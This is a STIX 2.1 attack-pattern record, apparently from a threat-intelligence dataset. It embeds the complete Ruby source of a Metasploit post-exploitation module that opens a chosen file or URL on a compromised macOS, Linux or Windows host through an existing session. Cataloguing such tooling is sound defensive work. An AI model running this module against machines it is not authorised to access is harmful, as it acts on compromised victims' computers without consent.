{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--d95d98f0-240d-44fb-9060-c41a1b8445fa",
    "created": "2024-08-14T16:33:18.000805Z",
    "modified": "2024-08-14T16:33:18.000809Z",
    "name": "Open a file or URL on the target computer",
    "description": "No description available.",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/post/multi/manage/open.rb",
            "external_id": "open.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Post\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Open a file or URL on the target computer',\n        'Description' => %q{\n          This module will open any file or URL specified with the URI format on the\n          target computer via the embedded commands such as 'open' or 'xdg-open'.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [ 'Eliott Teissonniere'],\n        'Platform' => [ 'osx', 'linux', 'win' ],\n        'SessionTypes' => [ 'shell', 'meterpreter' ]\n      )\n    )\n\n    register_options(\n      [\n        OptString.new('URI', [true, 'URI path to open'])\n      ]\n    )\n  end\n\n  #\n  # The OSX version simply uses 'open'\n  #\n  def osx_open(uri)\n    begin\n      cmd_exec(\"open #{uri}\")\n    rescue EOFError\n      return false\n    end\n\n    true\n  end\n\n  #\n  # The Linux version relies on 'xdg-open'\n  #\n  def linux_open(uri)\n    begin\n      cmd_exec(\"xdg-open #{uri}\")\n    rescue EOFError\n      return false\n    end\n\n    true\n  end\n\n  def win_open(uri)\n    begin\n      cmd_exec(\"cmd.exe /c start #{uri}\")\n    rescue EOFError\n      return false\n    end\n\n    true\n  end\n\n  def open(uri)\n    case session.platform\n    when 'osx'\n      return osx_open(uri)\n    when 'linux'\n      return linux_open(uri)\n    when 'windows'\n      return win_open(uri)\n    end\n  end\n\n  def run\n    uri = datastore['URI']\n\n    print_status(\"Opening #{uri}\")\n    if open(uri)\n      print_good('Success')\n    else\n      print_error('Command failed')\n    end\n  end\nend\n",
    "x_mitre_contributors": [
        "[ Eliott Teissonniere]",
        ""
    ],
    "x_mitre_platforms": [
        "[ 'osx', 'linux', 'win' ]"
    ]
}